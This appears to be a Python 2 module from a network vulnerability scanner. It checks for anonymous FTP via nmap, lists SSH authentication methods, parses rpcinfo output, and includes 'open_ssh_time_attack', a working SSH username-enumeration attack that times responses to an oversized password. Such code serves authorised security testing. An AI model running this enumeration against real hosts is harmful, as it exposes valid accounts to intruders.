import logging
import socket
import time
import paramiko
from apps.utility import run_process

logger = logging.getLogger('paramiko')


def ftp_anonymous_access_check(host, port=21):
    cmd = 'nmap -Pn -n  -p{} --script=ftp-anon {}'
    output = run_process(cmd.format(port, host))
    res = []
    ftp_anon_allow = False
    for line in output:
        if line.startswith('| ftp-anon: Anonymous FTP login allowed'):
            ftp_anon_allow = True
            res = output[output.index(line):-1]
            break
    return ftp_anon_allow, res


def ssh_authentication_types_available_check(host, port=22):
    cmd = 'ssh -vT -o PreferredAuthentications=none -o StrictHostKeyChecking=no {} -p {}'
    output = run_process(cmd.format(host, port))
    auth_types = []
    for line in output:
        line = line.strip()
        if line.startswith('Permission denied ('):
            sep = line.split('(')[1].strip(').').split(',')
            auth_types.extend(sep)
    return auth_types


def open_ssh_time_attack(host, port, user_list):
    password = '*' * 30000
    users = []
    for user in user_list:
        logger.info('{}@{}:{}'.format(user, host, port))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            sock.connect((host, int(port)))
        except (socket.error, socket.timeout), e:
            logger.info(e)
            return
        para = paramiko.Transport(sock)
        try:
            para.start_client()
        except paramiko.SSHException, e:
            logger.info(e)
        start_time = time.time()
        try:
            para.auth_password(user, password)
        except (paramiko.AuthenticationException, paramiko.SSHException, socket.error), e:
            logger.info(e)
        end_time = time.time()
        if end_time - start_time > 15:
            users.append(user)
    return users


def rpc_info(host):
    cmd = 'rpcinfo -p {}'
    info = []
    ports = {}
    output = run_process(cmd.format(host))
    for index, line in enumerate(output):
        line = line.strip()
        if index == 0 and not line.startswith('program vers proto   port  service'):
            break
        elif index == 0 and line.startswith('program vers proto   port  service'):
            continue
        sep = line.split()
        if len(sep) != 5:
            return
        program, vers, proto, port, service = sep
        info.append((program, vers, proto, port, service))
        cur_ports = ports.get(proto, {}).get('open', [])
        if port not in cur_ports:
            ports.setdefault(proto, {}).setdefault('open', []).append(port)
    return info, ports
